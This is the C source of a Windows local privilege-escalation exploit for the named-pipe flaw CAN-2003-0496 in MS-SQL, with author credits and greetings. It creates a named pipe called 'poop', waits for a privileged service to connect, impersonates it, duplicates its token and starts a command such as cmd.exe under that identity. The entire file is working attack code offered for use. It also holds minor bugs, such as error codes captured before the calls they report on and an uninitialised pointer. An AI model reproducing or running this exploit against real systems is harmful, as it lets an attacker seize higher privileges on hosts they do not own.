/*  tac0tac0.c - pay no attention to the name, long
story...
  *
  *
  *
  *  Author:  Maceo
  *  Modified to take advantage of CAN-2003-0496 Named
Pipe Filename
  *  Local Privilege Escalation Found by @stake. Use with
their advisory
  *  -wirepair@sh0dan.org
http://sh0dan.org/files/tac0tac0.c
  *
  *
  *  All credits for code go to Maceo, i really did
minimal work
  *  with his code, it took me like 3 seconds heh.
  *  Shouts to #innercircle,
  *
  */


#include <stdio.h>
#include <windows.h>


int main(int argc, char **argv)
{
   char szPipe[64];
   DWORD dwNumber = 0;
   DWORD dwType = REG_DWORD;
   DWORD dwSize = sizeof(DWORD);
   DWORD dw = GetLastError();
   HANDLE hToken, hToken2;
   PGENERIC_MAPPING pGeneric;
   SECURITY_ATTRIBUTES sa;
   DWORD dwAccessDesired;
   PACL pACL = NULL;
   PSECURITY_DESCRIPTOR pSD = NULL;
   STARTUPINFO si;
   PROCESS_INFORMATION pi;


   if (argc != 2) {
	  fprintf(stderr, "Usage: %s <cmd.exe>\nNamed Pipe Local
Priv Escalation found by @stake.\n"
					   "This code is to be used with MS-SQL exactly as
outlined in their advisory\n"
					   "All credit for this code goes to Maceo, he did a
fine job.. -wire\n"
					   "Also thanks goes to brett Moore for helping me
with DuplicateTokenEx, thanks buddy guy!\n",argv[0]);
					   exit(1);
   }
   memset(&si,0,sizeof(si));
   sprintf(szPipe, "\\\\.\\pipe\\poop");

   // create the named pipe
   HANDLE hPipe = 0;
   hPipe = CreateNamedPipe (szPipe, PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE|PIPE_WAIT, 2, 0, 0, 0, NULL);
   if (hPipe == INVALID_HANDLE_VALUE) {
     printf ("Failed to create named pipe:\n  %s\n",
szPipe);
     return 3;
   }
   printf("Created Named Pipe: \\\\.\\pipe\\poop\n");

   // setup security attribs
   pSD = (PSECURITY_DESCRIPTOR) LocalAlloc(LPTR,
SECURITY_DESCRIPTOR_MIN_LENGTH);
   InitializeSecurityDescriptor(pSD,
SECURITY_DESCRIPTOR_REVISION);
   SetSecurityDescriptorDacl(pSD,TRUE, pACL, FALSE);
   sa.nLength = sizeof (SECURITY_ATTRIBUTES);
   sa.lpSecurityDescriptor = pSD;
   sa.bInheritHandle = FALSE;

   printf("Waiting for connection...\n");
   // wait for client to connect
   ConnectNamedPipe (hPipe, NULL);

   // assume the identity of the client //
   if (!ImpersonateNamedPipeClient (hPipe)) {
     printf ("Failed to impersonate the named pipe.\n");
     CloseHandle(hPipe);
     return 5;
   }

   if (!OpenThreadToken(GetCurrentThread(),
TOKEN_ALL_ACCESS, TRUE, &hToken )) {
	     if (hToken != INVALID_HANDLE_VALUE) {
			 printf("GetLastError: %u\n", dw);
              CloseHandle(hToken);
			 exit(0);
		 }
   }

   printf("Duplicating Token...\n");
   if(DuplicateTokenEx(hToken,MAXIMUM_ALLOWED,&sa,SecurityImpersonation,
TokenPrimary,&hToken2) == 0) {
	  printf("error in duplicate token\n");
	  printf("GetLastError: %u\n", dw);
	  exit(0);
   }
   MapGenericMask( &dwAccessDesired, pGeneric );

   // display impersonating users name
   dwSize  = 256;
   char szUser[256];
   GetUserName(szUser, &dwSize);
   printf ("Impersonating: %s\n", szUser);

   si.cb = sizeof(si);
   si.lpDesktop = NULL;

   printf("Creating New Process %s\n", argv[1]);
   if(!CreateProcessAsUser(hToken2, NULL, argv[1], &sa,
&sa,true, NORMAL_PRIORITY_CLASS |
CREATE_NEW_CONSOLE,NULL,NULL,&si, &pi)) {
      printf("GetLastError: %u\n", dw);
   }
   CloseHandle(hPipe);

   return 0;
}

